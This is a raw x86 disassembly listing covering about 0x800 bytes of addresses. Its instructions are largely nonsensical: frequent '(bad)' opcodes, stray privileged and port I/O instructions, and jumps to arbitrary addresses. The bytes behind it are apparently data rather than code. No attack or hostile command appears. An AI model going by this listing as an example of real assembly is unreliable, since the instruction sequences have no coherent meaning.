  532ac9:	call   0x632b6799
  532ace:	push   es
  532acf:	les    ebx,FWORD PTR ds:0x2b55902
  532ad5:	push   eax
  532ad6:	ins    BYTE PTR es:[edi],dx
  532ad7:	nop
  532ad8:	push   ds
  532ad9:	xchg   ebp,eax
  532ada:	or     BYTE PTR gs:[edi-0x60f49c32],cl
  532ae1:	icebp  
  532ae2:	jle    0x532b11
  532ae4:	ret    
  532ae5:	shl    DWORD PTR [edi-0x3e],0x27
  532ae9:	call   0x6e11:0x97ca16a8
  532af0:	cmp    esi,DWORD PTR [edx]
  532af2:	or     bh,BYTE PTR [edi]
  532af4:	addr16 mov ah,0xa4
  532af7:	ss adc esi,ebx
  532afa:	sti    
  532afb:	repz or bh,BYTE PTR [ebx-0x62]
  532aff:	push   ebp
  532b00:	fwait
  532b01:	ins    BYTE PTR es:[edi],dx
  532b02:	outs   dx,DWORD PTR ds:[esi]
  532b03:	xor    al,0xfb
  532b05:	jle    0x532add
  532b07:	retf   
  532b08:	(bad)  
  532b09:	dec    eax
  532b0a:	pop    edi
  532b0b:	xchg   DWORD PTR [edi+0x17],ebx
  532b0e:	or     al,ch
  532b10:	cmp    BYTE PTR [ebx],bh
  532b12:	inc    edx
  532b13:	cs popf 
  532b15:	xor    DWORD PTR [ebx+0xb0259fb],0xadb6a866
  532b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  532b20:	inc    esi
  532b21:	pop    ds
  532b22:	das    
  532b23:	push   es
  532b24:	pop    edx
  532b25:	fistp  DWORD PTR [edi-0x6a282e66]
  532b2b:	(bad)  
  532b2c:	lahf   
  532b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  532b2e:	enter  0xbb64,0xa9
  532b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  532b33:	cmp    BYTE PTR [eax],bh
  532b35:	jge    0x532bb5
  532b37:	enter  0xe540,0x67
  532b3b:	jns    0x532b58
  532b3d:	repnz imul ebp,DWORD PTR [esi+0x40127677],0x5b
  532b45:	clc    
  532b46:	(bad)  
  532b47:	or     eax,0xaff0830e
  532b4c:	call   0xedeafd1
  532b51:	push   0xffffffdf
  532b53:	add    DWORD PTR cs:[ebx],eax
  532b56:	sbb    al,cl
  532b58:	inc    ebx
  532b59:	push   cs
  532b5a:	mov    ecx,0xae26aabb
  532b5f:	mov    bh,0x38
  532b61:	es pop ss
  532b63:	dec    ebp
  532b64:	out    0xac,eax
  532b66:	call   0x9cef:0xf0087b81
  532b6d:	stos   DWORD PTR es:[edi],eax
  532b6e:	mov    WORD PTR [ebx-0x63],?
  532b71:	dec    esi
  532b72:	xlat   BYTE PTR ds:[ebx]
  532b73:	sbb    bl,cl
  532b75:	cmp    DWORD PTR ss:[eax-0x7e],ecx
  532b79:	popf   
  532b7a:	sbb    al,bl
  532b7c:	jae    0x532bce
  532b7e:	jne    0x532b9d
  532b80:	add    DWORD PTR [esi],ebx
  532b82:	stos   DWORD PTR es:[edi],eax
  532b83:	mov    WORD PTR [ebp-0x40],?
  532b86:	jl     0x532c00
  532b88:	test   al,0x62
  532b8a:	dec    edx
  532b8b:	lock test BYTE PTR [ebx+0x760046e7],cl
  532b92:	sub    BYTE PTR [ebp+0x2c],0x55
  532b96:	outs   dx,DWORD PTR ds:[esi]
  532b97:	push   0x14
  532b99:	fsub   QWORD PTR [eax+0x38f90838]
  532b9f:	js     0x532bec
  532ba1:	xor    BYTE PTR [eax+0x7f7ae1e1],ch
  532ba7:	hlt    
  532ba8:	push   0xef61b41e
  532bad:	add    esp,eax
  532baf:	retf   0xc80
  532bb2:	or     eax,0xb375a8e8
  532bb7:	push   es
  532bb8:	sbb    eax,0x2b974013
  532bbd:	xlat   BYTE PTR ds:[ebx]
  532bbe:	pop    ds
  532bbf:	xchg   esp,eax
  532bc0:	dec    esp
  532bc1:	ficomp DWORD PTR [eax]
  532bc3:	in     al,0xbc
  532bc5:	and    eax,0xc1f04cee
  532bca:	inc    esp
  532bcb:	mov    BYTE PTR [ebp-0x3b],dh
  532bce:	jecxz  0x532bbc
  532bd0:	aad    0x1
  532bd2:	out    0x2e,al
  532bd4:	ja     0x532bf3
  532bd6:	lods   eax,DWORD PTR ds:[esi]
  532bd7:	dec    ebp
  532bd8:	(bad)  
  532bd9:	mov    ch,BYTE PTR [edx-0x7bc83311]
  532bdf:	aas    
  532be0:	loope  0x532bab
  532be2:	and    eax,0xa587487
  532be7:	and    BYTE PTR fs:[esi+0x49],dh
  532beb:	scas   al,BYTE PTR es:[edi]
  532bec:	push   ecx
  532bed:	out    0xd4,eax
  532bef:	cmp    BYTE PTR [edi+0x4583c9dd],ch
  532bf5:	in     al,dx
  532bf6:	rcl    DWORD PTR [esi-0x323434fc],1
  532bfc:	sub    eax,0x96a074f9
  532c01:	jae    0x532bca
  532c03:	sub    eax,0xdc9b872d
  532c08:	inc    ecx
  532c09:	addr16 jbe 0x532c4d
  532c0c:	(bad)
  532c0f:	jle    0x532c53
  532c11:	add    eax,0x9a33ba36
  532c16:	xchg   edx,eax
  532c17:	mov    dh,BYTE PTR [ebx-0x4e166f84]
  532c1d:	xchg   edx,eax
  532c1e:	jl     0x532c3a
  532c20:	jmp    0x532bca
  532c22:	push   esi
  532c23:	ror    DWORD PTR ds:0x9d20e4b7,cl
  532c29:	mov    esi,0xece875f
  532c2e:	cmp    esi,ebp
  532c30:	ins    BYTE PTR es:[edi],dx
  532c31:	sahf   
  532c32:	xor    DWORD PTR [ebp-0x46a4706b],esp
  532c38:	lea    ebp,[esi]
  532c3a:	or     ah,BYTE PTR ds:0x294b8750
  532c40:	fwait
  532c41:	sub    BYTE PTR [ebp+0x79a22e41],bl
  532c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  532c48:	or     esp,DWORD PTR [ebp+ebp*1+0x3f1cc2c7]
  532c4f:	mov    BYTE PTR [eax],cl
  532c51:	jns    0x532ca1
  532c53:	adc    DWORD PTR [ebp+esi*1+0x65],ecx
  532c57:	push   ebx
  532c58:	nop
  532c59:	jle    0x532c79
  532c5b:	fwait
  532c5c:	xchg   ebp,eax
  532c5d:	(bad)  
  532c5e:	push   esi
  532c5f:	sub    edi,DWORD PTR [ecx]
  532c61:	in     al,dx
  532c62:	shl    BYTE PTR [edx+0x76355c1d],1
  532c68:	jbe    0x532c7d
  532c6a:	push   cs
  532c6b:	mov    esp,0xd2377c3a
  532c70:	or     DWORD PTR [edx-0x5b745c42],esi
  532c76:	cdq    
  532c77:	push   cs
  532c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  532c79:	test   edi,eax
  532c7b:	rol    BYTE PTR [edx-0x1eab0286],1
  532c81:	fcmovnu st,st(2)
  532c83:	(bad)  
  532c84:	dec    ecx
  532c85:	dec    esi
  532c86:	gs mov ax,0x82cc
  532c8b:	mov    edx,0x737a190b
  532c90:	adc    ecx,ecx
  532c92:	mov    bh,0x12
  532c94:	mov    WORD PTR ds:0x7b5200d5,ds
  532c9a:	stos   DWORD PTR es:[edi],eax
  532c9b:	ins    DWORD PTR es:[edi],dx
  532c9c:	xor    DWORD PTR fs:[ecx+0x40],0x50babcbe
  532ca4:	push   es
  532ca5:	stc    
  532ca6:	dec    esi
  532ca7:	cwde   
  532ca8:	mov    eax,ds:0xcb4ebe60
  532cad:	out    0x38,eax
  532caf:	mov    edi,0xc16e34ad
  532cb4:	and    eax,0x1f536187
  532cb9:	fisttp DWORD PTR [edi-0x55]
  532cbc:	jns    0x532cb7
  532cbe:	pop    edx
  532cbf:	or     al,0x6
  532cc1:	aaa    
  532cc2:	xchg   ecx,eax
  532cc3:	jmp    0x532cb9
  532cc5:	pop    ebx
  532cc6:	mov    dh,0x91
  532cc8:	popf   
  532cc9:	lods   al,BYTE PTR ds:[esi]
  532cca:	icebp  
  532ccb:	repz aad 0x3e
  532cce:	int3   
  532ccf:	push   ebp
  532cd0:	sbb    eax,0xe05fc36f
  532cd5:	test   BYTE PTR [ebx-0x4c],dl
  532cd8:	fwait
  532cd9:	test   al,0x7c
  532cdb:	cdq    
  532cdc:	out    0xb7,eax
  532cde:	xor    DWORD PTR [esi-0x4a],esp
  532ce1:	(bad)  
  532ce2:	mov    dh,0x57
  532ce4:	mov    DWORD PTR [eax-0x70a24eeb],ebx
  532cea:	and    al,0xc
  532cec:	mov    eax,ds:0xdd166ee5
  532cf1:	repz aas 
  532cf3:	dec    ebp
  532cf4:	shl    esp,cl
  532cf6:	ffreep st(4)
  532cf8:	stos   BYTE PTR es:[edi],al
  532cf9:	mov    BYTE PTR [ebx+0x779c88b],dl
  532cff:	ret    
  532d00:	fwait
  532d01:	dec    ecx
  532d02:	mov    al,0x51
  532d04:	mov    ebx,0x42d4b5d5
  532d09:	push   ecx
  532d0a:	inc    ecx
  532d0b:	push   0xfd59d453
  532d10:	test   al,0x1d
  532d12:	in     al,0xb
  532d14:	pop    es
  532d15:	sbb    esp,ebp
  532d17:	stos   DWORD PTR es:[edi],eax
  532d18:	add    esp,DWORD PTR [esi+ebp*8-0x3af7b5be]
  532d1f:	jmp    0x532d5f
  532d21:	jmp    0x532d44
  532d23:	mov    al,ds:0x79e2a2ca
  532d28:	add    ch,cl
  532d2a:	xchg   esp,eax
  532d2b:	ins    DWORD PTR es:[edi],dx
  532d2c:	inc    edx
  532d2d:	inc    esi
  532d2e:	mov    ah,0xdf
  532d30:	stos   BYTE PTR es:[edi],al
  532d31:	cmp    eax,0x885267af
  532d36:	add    DWORD PTR [eax-0x34],esi
  532d39:	mov    WORD PTR [edx],gs
  532d3b:	test   BYTE PTR [edi-0x6e5b40dc],0xfc
  532d42:	mov    esp,DWORD PTR [ecx+eax*2+0x787804dd]
  532d49:	sbb    al,0x2c
  532d4b:	iret   
  532d4c:	jns    0x532cfe
  532d4e:	jno    0x532d31
  532d50:	jb     0x532d3a
  532d52:	add    bh,dh
  532d54:	mov    WORD PTR ds:0x598bd460,es
  532d5a:	cs jno 0x532d41
  532d5d:	call   0x915f6514
  532d62:	dec    BYTE PTR [esi+0x74]
  532d65:	mov    cl,BYTE PTR [ebp+0x456f8bd7]
  532d6b:	ja     0x532de0
  532d6d:	cs test edi,edi
  532d70:	and    eax,0xf4772358
  532d75:	pusha  
  532d76:	xlat   BYTE PTR ds:[ebx]
  532d77:	mov    ch,0x49
  532d79:	pop    es
  532d7a:	push   0x72222fda
  532d7f:	cwde   
  532d80:	add    DWORD PTR [edi],ecx
  532d82:	xor    eax,0xf80cb15d
  532d87:	mov    ch,0x2d
  532d8a:	(bad)  [ebp-0x31]
  532d8d:	mov    ebx,DWORD PTR [ebp+0x6ecace16]
  532d93:	mov    eax,ds:0x7fbf7d1f
  532d98:	push   WORD PTR [eax]
  532d9b:	adc    edi,ebp
  532d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  532d9e:	xchg   esp,eax
  532d9f:	sahf   
  532da0:	adc    DWORD PTR [ecx+0x3f9e48f7],ebx
  532da6:	sbb    ebx,DWORD PTR [ebx-0x3fd99fa6]
  532dac:	mov    dl,0x77
  532dae:	jle    0x532df9
  532db0:	stos   DWORD PTR es:[edi],eax
  532db1:	std    
  532db2:	popa   
  532db3:	inc    ebp
  532db4:	call   0xa61d1e75
  532db9:	fiadd  DWORD PTR [ecx-0x44]
  532dbc:	cli    
  532dbd:	(bad)  
  532dbe:	add    eax,0x250bac3a
  532dc3:	(bad)  
  532dc4:	std    
  532dc5:	outs   dx,DWORD PTR ds:[esi]
  532dc6:	fst    QWORD PTR [ebx+ebp*4+0x55]
  532dca:	ret    0xf204
  532dcd:	mov    cl,0x74
  532dcf:	adc    BYTE PTR [ecx],dh
  532dd1:	lock (bad) 
  532dd3:	push   0x40a8b563
  532dd8:	aam    0x97
  532dda:	fwait
  532ddb:	xchg   ebp,eax
  532ddc:	test   eax,0xb98a8002
  532de1:	retf   
  532de2:	fisub  WORD PTR [edi]
  532de4:	arpl   WORD PTR [ecx],ax
  532de6:	inc    esi
  532de7:	push   ss
  532de8:	jecxz  0x532db8
  532dea:	pop    ds
  532deb:	pop    ebp
  532dec:	add    ecx,eax
  532dee:	not    ebp
  532df0:	bound  edi,QWORD PTR [ecx+0xa]
  532df3:	add    al,cl
  532df5:	ja     0x532e3f
  532df7:	outs   dx,DWORD PTR ds:[esi]
  532df8:	into   
  532df9:	into   
  532dfa:	ss inc edi
  532dfc:	push   edx
  532dfd:	adc    ebp,esp
  532dff:	clc    
  532e00:	ds clc 
  532e02:	and    DWORD PTR fs:[eax-0xb9eb5ae],0x1a
  532e0a:	cld    
  532e0b:	inc    ecx
  532e0c:	lds    ebx,FWORD PTR [ebp+0x67]
  532e0f:	repz mov ecx,0x7c6a3754
  532e15:	dec    esp
  532e16:	fild   WORD PTR [edi+0x3b408144]
  532e1c:	pop    es
  532e1d:	mov    ebp,0x72d54a35
  532e22:	pushf  
  532e23:	mov    edx,0xc81164f0
  532e28:	mov    eax,ds:0x51bd6de2
  532e2d:	dec    ecx
  532e2e:	xchg   edi,eax
  532e2f:	jne    0x532ea4
  532e31:	dec    esi
  532e32:	xchg   BYTE PTR [eax-0x37],ah
  532e35:	jmp    0xb8d3d6df
  532e3a:	int3   
  532e3b:	fwait
  532e3c:	push   eax
  532e3d:	add    BYTE PTR [edx],bl
  532e3f:	into   
  532e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  532e41:	clc    
  532e42:	stc    
  532e43:	mov    dh,0xf2
  532e45:	jmp    0x532e58
  532e47:	jmp    0x96ad61f2
  532e4c:	mov    eax,ds:0xbd2101dd
  532e51:	jae    0x532ebc
  532e53:	fwait
  532e54:	mov    edi,ebp
  532e56:	call   0xb96a22da
  532e5b:	addr16 mov bh,0x54
  532e5e:	or     dh,BYTE PTR [ebx]
  532e60:	sar    DWORD PTR [edi],cl
  532e62:	sti    
  532e63:	push   eax
  532e64:	hlt    
  532e65:	jecxz  0x532df1
  532e67:	cmp    ch,BYTE PTR [ebp+0x5a]
  532e6a:	call   0x5403a2ac
  532e6f:	and    al,0xe0
  532e71:	pop    ecx
  532e72:	mov    al,ch
  532e74:	pop    ecx
  532e75:	sub    ebx,DWORD PTR [esi-0x31]
  532e78:	ins    DWORD PTR es:[edi],dx
  532e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  532e7a:	out    0xa3,eax
  532e7c:	jo     0x532e98
  532e7e:	xchg   edx,eax
  532e7f:	xor    bh,BYTE PTR [esi+0x6062b4ee]
  532e85:	add    ebx,DWORD PTR [eax-0x59]
  532e88:	jmp    0x532e56
  532e8a:	fimul  DWORD PTR [edx]
  532e8c:	jge    0x532e99
  532e8e:	dec    ebp
  532e8f:	out    0x3e,eax
  532e91:	imul   ecx,DWORD PTR [eax+eiz*2],0xfffffffe
  532e95:	or     ah,ch
  532e97:	mov    ebp,0x450b1f75
  532e9c:	inc    ecx
  532e9d:	xchg   esi,eax
  532e9e:	mov    ah,0x35
  532ea0:	jecxz  0x532f18
  532ea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  532ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  532ea4:	sti    
  532ea5:	stc    
  532ea6:	fdiv   DWORD PTR [esi]
  532ea8:	mov    edi,0x94f91e8e
  532ead:	jecxz  0x532e73
  532eaf:	scas   al,BYTE PTR es:[edi]
  532eb0:	cmp    al,ah
  532eb2:	rcr    BYTE PTR [ebp-0x34b712ed],1
  532eb8:	or     eax,DWORD PTR [ebx+0x2554e62e]
  532ebe:	push   es
  532ebf:	lods   eax,DWORD PTR ds:[esi]
  532ec0:	adc    dh,BYTE PTR [eax+0x70]
  532ec3:	add    DWORD PTR [esi],ebx
  532ec5:	lea    edi,[ebx]
  532ec7:	inc    esp
  532ec8:	scas   al,BYTE PTR es:[edi]
  532ec9:	mov    ah,0x8
  532ecb:	and    DWORD PTR [esi+0x6],edx
  532ece:	cld    
  532ecf:	ins    DWORD PTR es:[edi],dx
  532ed0:	pop    ebx
  532ed1:	ins    DWORD PTR es:[edi],dx
  532ed2:	add    eax,0x30556674
  532ed7:	scas   al,BYTE PTR es:[edi]
  532ed8:	add    DWORD PTR [ecx+0x10a89f1d],eax
  532ede:	js     0x532f02
  532ee0:	es pop esp
  532ee2:	xor    al,0x27
  532ee4:	leave  
  532ee5:	scas   al,BYTE PTR es:[edi]
  532ee6:	mov    esp,0x33ab590d
  532eeb:	cmp    eax,0xb503a8f8
  532ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  532ef1:	je     0x532efa
  532ef3:	mov    ah,BYTE PTR [esi]
  532ef5:	retf   
  532ef6:	jg     0x532f6e
  532ef8:	jnp    0x532f2e
  532efa:	jno    0x532ee6
  532efc:	mov    ebx,ds
  532efe:	and    eax,ebx
  532f00:	fist   WORD PTR ds:0xa38d0270
  532f06:	add    al,0xa8
  532f08:	pushf  
  532f09:	fist   DWORD PTR [edx]
  532f0b:	mov    gs,WORD PTR [ebx+0x49f3399]
  532f11:	popf   
  532f12:	push   ecx
  532f13:	mov    edi,0x4b12167b
  532f18:	ja     0x532f46
  532f1a:	xchg   edi,eax
  532f1b:	mov    ecx,0x9b987b37
  532f20:	ret    0x340
  532f23:	sub    eax,DWORD PTR [edx+edi*1]
  532f26:	jmp    0x532f39
  532f28:	pop    es
  532f29:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  532f2b:	sub    eax,0x26bbf69f
  532f30:	in     al,dx
  532f31:	fs ret 0xeb9d
  532f35:	ja     0x532f2b
  532f37:	xchg   ecx,eax
  532f38:	sub    ah,BYTE PTR [eax+0xbd05fee]
  532f3e:	pop    es
  532f3f:	hlt    
  532f40:	adc    DWORD PTR [eax+0x6e],ebp
  532f43:	dec    edx
  532f44:	xchg   edi,eax
  532f45:	pop    ebp
  532f46:	popa   
  532f47:	lods   al,BYTE PTR ds:[esi]
  532f48:	dec    ebp
  532f49:	mov    ebp,0xdfa6cdca
  532f4e:	push   0x17e2c941
  532f53:	push   0xe7479e3e
  532f58:	push   edi
  532f59:	mov    dh,0xc6
  532f5b:	dec    eax
  532f5c:	xor    DWORD PTR [eax],0x1841cfb3
  532f62:	scas   al,BYTE PTR es:[edi]
  532f63:	jecxz  0x532f4c
  532f65:	int    0x82
  532f67:	pop    es
  532f68:	scas   eax,DWORD PTR es:[edi]
  532f69:	or     esi,ebx
  532f6b:	bound  eax,QWORD PTR [ecx+0x593d0d03]
  532f71:	jb     0x532f56
  532f73:	aam    0xba
  532f75:	(bad)  
  532f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  532f77:	dec    ebx
  532f78:	dec    esp
  532f79:	daa    
  532f7a:	xor    DWORD PTR [ecx-0x58],ecx
  532f7d:	clts   
  532f7f:	xlat   BYTE PTR ds:[ebx]
  532f80:	repnz cmc 
  532f82:	dec    esi
  532f83:	jle    0x532fa4
  532f85:	push   ebx
  532f86:	inc    ebx
  532f87:	jns    0x532fdb
  532f89:	mov    esi,0xe552babc
  532f8e:	(bad)  
  532f8f:	lds    eax,FWORD PTR [edx-0x8]
  532f92:	cdq    
  532f93:	sbb    cl,ah
  532f95:	jg     0x532f26
  532f97:	test   eax,0x81c0d408
  532f9c:	clc    
  532f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  532f9e:	adc    eax,DWORD PTR [ebp+0x1a]
  532fa1:	loope  0x532f81
  532fa3:	fnsave [edx-0x5b]
  532fa6:	or     BYTE PTR [eax],bh
  532fa8:	lea    eax,ds:0x4b1eb394
  532fae:	and    DWORD PTR [eax],edi
  532fb0:	sub    DWORD PTR [edi],ebx
  532fb2:	sub    DWORD PTR [eax+0x524a1594],0x5bc6e0f7
  532fbc:	adc    al,0x6b
  532fbe:	cmp    ecx,edi
  532fc0:	pusha  
  532fc1:	fld    DWORD PTR [ebx+0x48bf9e72]
  532fc7:	push   edx
  532fc8:	add    al,0xd9
  532fca:	outs   dx,DWORD PTR ds:[esi]
  532fcb:	cld    
  532fcc:	xchg   ebp,eax
  532fcd:	jmp    0xfe03:0x57f9de64
  532fd4:	pop    edx
  532fd5:	add    eax,0x71902806
  532fda:	stos   BYTE PTR es:[edi],al
  532fdb:	ja     0x532fc9
  532fdd:	ds mov ebx,0xd4bac663
  532fe3:	mov    edi,0xb21f9806
  532fe8:	loope  0x532fe1
  532fea:	pop    edi
  532feb:	fnsave [eax]
  532fed:	lods   al,BYTE PTR ds:[esi]
  532fee:	mov    BYTE PTR [ecx-0x6421cd03],ah
  532ff4:	jmp    0xade1df4a
  532ff9:	jmp    0x532f81
  532ffb:	xchg   BYTE PTR [ecx-0x2e],ch
  532ffe:	out    0xca,eax
  533000:	mov    al,ds:0xd1023051
  533005:	stc    
  533006:	add    esi,0x6b
  533009:	int3   
  53300a:	pop    edi
  53300b:	stos   DWORD PTR es:[edi],eax
  53300c:	ja     0x532fa0
  53300e:	add    al,0x5a
  533010:	in     al,0x9b
  533012:	jbe    0x53301b
  533014:	dec    edx
  533015:	test   al,0x6f
  533017:	loope  0x53305c
  533019:	stos   BYTE PTR es:[edi],al
  53301a:	mov    ?,esi
  53301c:	loopne 0x533073
  53301e:	mov    gs,WORD PTR [ebx+0x59]
  533021:	jmp    0x532fd4
  533023:	xchg   BYTE PTR [esi-0x439a5e52],dl
  533029:	mov    dh,0xe1
  53302b:	mov    ch,0xd5
  53302d:	outs   dx,DWORD PTR ds:[esi]
  53302e:	ss adc al,0x3b
  533031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  533032:	sub    al,dh
  533034:	mov    ah,0xd
  533036:	imul   eax,edx,0x74edd848
  53303c:	dec    ebp
  53303d:	inc    ebp
  53303e:	call   0x39b4:0x4f8dc6e
  533045:	or     DWORD PTR [edx+0x68a7a71d],edi
  53304b:	inc    edx
  53304c:	push   ebp
  53304d:	push   ebp
  53304e:	popa   
  53304f:	fwait
  533050:	mov    ds:0xc75c0171,eax
  533055:	popf   
  533056:	sub    al,0x9e
  533058:	dec    eax
  533059:	std    
  53305a:	mov    ebp,0xcda03a1c
  53305f:	xor    edx,edi
  533061:	sub    al,0x8e
  533063:	mov    ecx,0x20b7b79b
  533068:	bound  ecx,QWORD PTR [esi+0x2689be77]
  53306e:	out    0x55,eax
  533070:	ds popa 
  533072:	mov    esi,0xbe18c886
  533077:	fst    DWORD PTR [edi]
  533079:	sub    ebp,DWORD PTR [edx-0xf]
  53307c:	inc    esi
  53307d:	or     ch,dh
  53307f:	test   eax,0xfe297ab7
  533084:	ret    
  533085:	stos   BYTE PTR es:[edi],al
  533086:	dec    eax
  533087:	fnstcw WORD PTR [ebx+0x286696a0]
  53308d:	ret    0xa7bb
  533090:	push   ss
  533091:	push   edx
  533092:	jecxz  0x533113
  533094:	adc    al,0xf8
  533096:	pushf  
  533097:	dec    ecx
  533098:	inc    ecx
  533099:	pop    esp
  53309a:	fidivr WORD PTR [ebx+0x20]
  53309d:	xor    al,0xf9
  53309f:	loopne 0x5330ca
  5330a1:	jle    0x533086
  5330a3:	pop    eax
  5330a4:	cli    
  5330a5:	sub    ebx,DWORD PTR [ebx+ebp*2]
  5330a8:	lods   eax,DWORD PTR ds:[esi]
  5330a9:	adc    al,0xa3
  5330ab:	imul   ebx,DWORD PTR [ebp+0x53a937ce],0x2166eb51
  5330b5:	scas   al,BYTE PTR es:[edi]
  5330b6:	push   ss
  5330b7:	ret    
  5330b8:	dec    eax
  5330b9:	push   esi
  5330ba:	jo     0x533129
  5330bc:	dec    edi
  5330bd:	mov    ecx,0x59318331
  5330c2:	mov    bh,0x1f
  5330c4:	mov    cl,0x5c
  5330c6:	or     cl,ch
  5330c8:	sub    bh,BYTE PTR [ecx+0x35]
  5330cb:	repnz inc eax
  5330cd:	xchg   ecx,eax
  5330ce:	xor    ebx,DWORD PTR ds:0x98087d2f
  5330d4:	cmp    eax,0x3355ef09
  5330d9:	cmp    DWORD PTR [ebx],edx
  5330db:	push   0xffffffcd
  5330dd:	xchg   ecx,eax
  5330de:	cdq    
  5330df:	mov    BYTE PTR [edx],0xde
  5330e2:	inc    edx
  5330e3:	pusha  
  5330e4:	and    DWORD PTR ds:0x5c95d0a8,edi
  5330ea:	jmp    0x959d:0x55db88b0
  5330f1:	mov    dh,0x9e
  5330f3:	ja     0x5330c3
  5330f5:	and    al,0xe4
  5330f7:	ins    DWORD PTR es:[edi],dx
  5330f8:	rol    DWORD PTR [ebx-0x1ca5daa9],1
  5330fe:	jmp    0x5c74:0x517007cf
  533105:	push   esp
  533106:	stos   BYTE PTR es:[edi],al
  533107:	push   ss
  533108:	or     DWORD PTR [ecx+0x69e64510],edx
  53310e:	loope  0x5330f3
  533110:	outs   dx,DWORD PTR ds:[esi]
  533111:	call   0xab7bf2ca
  533116:	inc    eax
  533117:	pop    ss
  533118:	xchg   ecx,eax
  533119:	push   esp
  53311a:	push   ebp
  53311b:	add    ecx,eax
  53311d:	ds inc edi
  53311f:	aaa    
  533120:	ret    0xe70b
  533123:	mov    cl,0x96
  533125:	mov    ecx,DWORD PTR fs:[ecx-0x2e3a44d5]
  53312c:	pop    edx
  53312d:	pop    ss
  53312e:	out    0x4,al
  533130:	popa   
  533131:	dec    ebx
  533132:	pop    ebp
  533133:	shr    DWORD PTR [eax-0x38cafb81],1
  533139:	mov    ds:0x8fa91d53,eax
  53313e:	loope  0x53318b
  533140:	jge    0x5330fe
  533142:	or     ebx,DWORD PTR [ebp+0x380d0ce4]
  533148:	out    0x85,al
  53314a:	test   DWORD PTR [ecx],0x41c99ef0
  533150:	adc    BYTE PTR [edi+0x37a59725],0x45
  533157:	test   BYTE PTR [ecx-0x30cc2414],dl
  53315d:	ja     0x53312d
  53315f:	jno    0x5331d6
  533161:	xor    ch,BYTE PTR [edx+0x34]
  533164:	xchg   esi,eax
  533165:	push   es
  533166:	call   0xebada63a
  53316b:	jmp    0x81950f03
  533170:	hlt    
  533171:	scas   eax,DWORD PTR es:[edi]
  533172:	retf   
  533173:	inc    edx
  533174:	rcl    BYTE PTR [edx-0x386ac3d2],cl
  53317a:	cs daa 
  53317c:	fnsave [edi+0x52206bab]
  533182:	or     DWORD PTR [edx-0x5cf845f],esp
  533188:	inc    edi
  533189:	daa    
  53318a:	push   es
  53318b:	pop    edi
  53318c:	mov    ch,0xf2
  53318e:	js     0x533130
  533190:	xlat   BYTE PTR ds:[ebx]
  533191:	dec    edi
  533192:	push   edx
  533193:	ja     0x53319e
  533195:	ftst   
  533197:	test   al,0x38
  533199:	and    cl,0x88
  53319c:	fs inc ecx
  53319e:	inc    esp
  53319f:	sub    bl,BYTE PTR [edi-0x6af69fd5]
  5331a5:	fstp   QWORD PTR [ebx+0x75052b6c]
  5331ab:	out    0xd6,al
  5331ad:	jg     0x53314c
  5331af:	les    ebx,FWORD PTR [ebx]
  5331b1:	(bad)  
  5331b2:	jp     0x53320d
  5331b4:	loop   0x533202
  5331b6:	mov    esi,0xeda919b4
  5331bb:	sub    eax,0x3e583008
  5331c0:	mov    WORD PTR [eax+ebp*4],ds
  5331c3:	push   ecx
  5331c4:	pusha  
  5331c5:	loop   0x5331b0
  5331c7:	ins    DWORD PTR es:[edi],dx
  5331c8:	mov    ds:0xbd0523a1,eax
  5331cd:	out    0x94,al
  5331cf:	mov    DWORD PTR [eax],edx
  5331d1:	fistp  WORD PTR [ebp-0x1746b0ba]
  5331d7:	xlat   BYTE PTR ds:[ebx]
  5331d8:	pop    esi
  5331d9:	jmp    0xeb3f:0x1ffa43cb
  5331e0:	(bad)  
  5331e2:	mov    ebx,0xc0837b1e
  5331e7:	pop    ebp
  5331e8:	hlt    
  5331e9:	cmp    bh,BYTE PTR [esi-0x7e]
  5331ec:	mov    gs:0x4d3f2a91,eax
  5331f2:	outs   dx,BYTE PTR ds:[esi]
  5331f3:	repz fsubr st,st(7)
  5331f6:	ret    0xecf4
  5331f9:	cmc    
  5331fa:	outs   dx,BYTE PTR ds:[esi]
  5331fb:	sub    ebp,esi
  5331fd:	sub    DWORD PTR [edx],ebx
  5331ff:	cld    
  533200:	fmul   QWORD PTR [edx+ebp*8+0x74]
  533204:	mov    edx,DWORD PTR [edi-0x6b35baf]
  53320a:	xchg   BYTE PTR [ebp+0x1b],dl
  53320d:	enter  0x5c86,0x9b
  533211:	inc    edi
  533212:	or     eax,0xe7e2d89d
  533217:	stos   DWORD PTR es:[edi],eax
  533218:	call   FWORD PTR [ecx]
  53321a:	push   0xffffffa1
  53321c:	icebp  
  53321d:	mov    ecx,DWORD PTR [eax-0x79d0d079]
  533223:	push   ecx
  533224:	mov    ds:0xbc4f4467,al
  533229:	mov    ch,0x35
  53322b:	jmp    0xf84c29c5
  533230:	xor    al,0x71
  533232:	push   eax
  533233:	es pop ss
  533235:	xchg   esi,eax
  533236:	pop    esp
  533237:	xchg   ebx,eax
  533238:	data16 inc BYTE PTR fs:[edx+0x462bc242]
  533240:	cmp    ah,bh
  533242:	mov    ch,0xd1
  533244:	or     ecx,DWORD PTR [ecx+ecx*2-0x1d]
  533248:	push   edi
  533249:	fs int 0x4f
  53324c:	adc    esp,DWORD PTR [edx]
  53324e:	xor    BYTE PTR [ecx+edi*2],ch
  533251:	mov    eax,0x75964098
  533256:	jo     0x533239
  533258:	and    dh,al
  53325a:	inc    ecx
  53325b:	mov    ebx,DWORD PTR [ecx-0x74]
  53325e:	pop    ecx
  53325f:	dec    ebx
  533260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  533261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  533262:	enter  0xe974,0xd6
  533266:	cli    
  533267:	cmp    DWORD PTR [ebx-0x5],esi
  53326a:	mov    ch,0xda
  53326c:	jno    0x5332a1
  53326e:	push   edx
